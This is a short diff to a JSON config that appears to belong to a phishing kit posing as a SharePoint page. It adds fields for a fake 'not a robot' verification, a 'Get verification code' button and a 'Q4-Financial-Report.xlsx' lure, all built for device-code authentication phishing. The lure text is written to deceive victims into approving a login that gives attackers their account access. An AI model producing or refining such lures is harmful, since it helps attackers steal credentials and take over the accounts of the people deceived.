@@ -3,8 +3,36 @@
   "preload": true,
   "auth_mode": "devicecode",
   "fields": [
-    { "key": "file_name", "label": "File Name", "type": "text", "default": "Q4-Financial-Report.xlsx" },
-    { "key": "pages", "label": "Pages", "type": "number", "default": 8 }
+    {
+      "key": "title",
+      "label": "Page Title",
+      "type": "text",
+      "default": "Please confirm that you are not a robot"
+    },
+    {
+      "key": "message",
+      "label": "Page Message",
+      "type": "text",
+      "default": "This SharePoint site requires authentication. Complete the verification process to continue."
+    },
+    {
+      "key": "button_text",
+      "label": "Button Text",
+      "type": "text",
+      "default": "Get verification code"
+    },
+    {
+      "key": "file_name",
+      "label": "File Name",
+      "type": "text",
+      "default": "Q4-Financial-Report.xlsx"
+    },
+    {
+      "key": "pages",
+      "label": "Pages",
+      "type": "number",
+      "default": 8
+    }
   ],
   "background": {
     "default": "sharepoint2_bg.jpg",
